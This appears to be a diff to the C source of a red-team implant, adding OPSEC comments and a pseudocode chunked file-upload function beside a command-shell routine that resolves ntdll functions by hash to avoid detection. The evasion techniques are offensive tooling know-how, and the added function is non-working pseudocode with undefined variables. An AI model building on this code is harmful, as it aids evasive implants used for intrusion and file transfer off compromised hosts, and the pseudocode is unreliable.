@@ -197,6 +197,10 @@ VOID CommandShell( PPARSER Parser ){
     PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
 
     // create process params struct
+
+    // If the process is created directly to execute the command,
+    // It's not very OPSEC compliant in the red teaming process
+    // If you have any ideas to share with me, pls email me. thank you!! ( Email: leviathanprot0n@proton.me )
     RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlCreateProcessParametersEx_CRC32B);
     check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
                                                NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
@@ -335,6 +339,48 @@ VOID CommandShell( PPARSER Parser ){
 #endif // CONFIG_NATIVE
 
 }
+// PR by Leviathan ( Email: leviathanprt0n@prton.me )
+// I want to support large file transfers in both the upload and download function
+// So I'd like to use chunked transfers to support my point
+//
+// I have two solutions, remake a **CommandUploadLarge** function and reuse the CommandUpload function
+//
+// ComandDispatch needs to understand which are continuous uploads/downloads modules and which are the heartbeat modules
+// I believe that it can be distinguished by simple signal transmission, but my code foundation is not very good.
+// And I am not able to implement it by myself, so I am very sorry
+//
+// 1. In the parser definition, TotalChunkNumber, FileTotalSize,ChunkID should be added.
+// 2. Reusing the CommandUpload in the CommandUpload function may be a good option in the red teaming.
+
+// Here's my pseudocode for chunked transfers, please refer to it
+VOID CommandUploadLarge(PPARSER Parser) {
+
+    // If the parser we receive determines that we want to transfer it in chunks
+    // We need to keep listening in this function or add the filter in CommandDispatcher?
+
+    // Reuse one buffer is a good choice in red teaming process
+
+    // 1024 * 1024 = 1MB
+    UINT32 ChunkSize = 1024 * 1024;
+    UINT32 TotalChunkNumber = GetParserTotalChunkNumber(Parser);
+    PVOID Content = NULL;
+    ContinueListen( Parser ){
+        NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtWriteFile_CRC32B);
+        check_debug(p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block,
+                                  Content, FileSize-1, 0, 0) == 0, "NtWriteFile Failed!");
+        memset(Content, 0, ChunkSize);
+        Content = NULL;
+
+        if( EndFlag == GetEndFlag(Parser) && offset < Chunksize ){
+            break;
+        } else {
+            continue;
+        }
+    }
+
+}
+
+
 
 VOID CommandUpload( PPARSER Parser ) {
 #if CONFIG_NATIVE == TRUE
